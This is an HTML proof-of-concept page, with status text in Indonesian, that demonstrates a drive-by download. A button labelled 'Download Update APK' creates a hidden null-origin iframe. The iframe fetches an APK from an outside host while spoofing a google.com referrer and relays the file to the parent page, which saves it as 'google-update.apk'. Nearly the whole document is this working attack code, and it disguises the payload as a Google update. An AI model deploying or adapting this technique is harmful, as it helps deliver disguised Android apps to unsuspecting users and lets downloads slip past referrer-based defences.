<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Drive-by Download POC 2025</title>
  <style>
    body {font-family: Arial; text-align:center; padding:50px; background:#f9f9f9;}
    button {background:#4CAF50; color:white; padding:16px 40px; font-size:18px; border:none; border-radius:12px; cursor:pointer;}
    #status {margin-top:20px; font-weight:bold; color:#333;}
  </style>
</head>
<body>

  <h2>Drive-by Download POC (2025)</h2>
  <button onclick="startDownload()">Download Update APK</button>
  <div id="status">Status: Siap</div>

  <script>
  function startDownload() {
    document.getElementById('status').textContent = 'Status: Sedang memproses...';

    // Buat iframe dengan origin null
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    
    iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
      <!DOCTYPE html>
      <script>
      (async () => {
        try {
          const r = await fetch('https://aliothme.github.io/poc.apk', {
            referrer: 'https://www.google.com/',
            referrerPolicy: 'unsafe-url',
            mode: 'cors',
            credentials: 'omit'
          });
          const blob = await r.blob();
          const url = URL.createObjectURL(blob);
          parent.postMessage({type:'OK', url:url}, '*');
        } catch(e) {
          parent.postMessage({type:'ERR', msg:e.message}, '*');
        }
      })();
      </script>
    `);

    document.body.appendChild(iframe);

    // Terima pesan dari iframe
    const handler = (e) => {
      if (e.data.type === 'OK') {
        const a = document.createElement('a');
        a.href = e.data.url;
        a.download = 'google-update.apk';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(e.data.url);
        iframe.remove();

        document.getElementById('status').textContent = 
          'Selesai! Cek Network â†’ Referer: https://www.google.com/';
        
        window.removeEventListener('message', handler);
      }
      if (e.data.type === 'ERR') {
        document.getElementById('status').textContent = 'Error: ' + e.data.msg;
      }
    };

    window.addEventListener('message', handler);
  }
  </script>
</body>
</html>
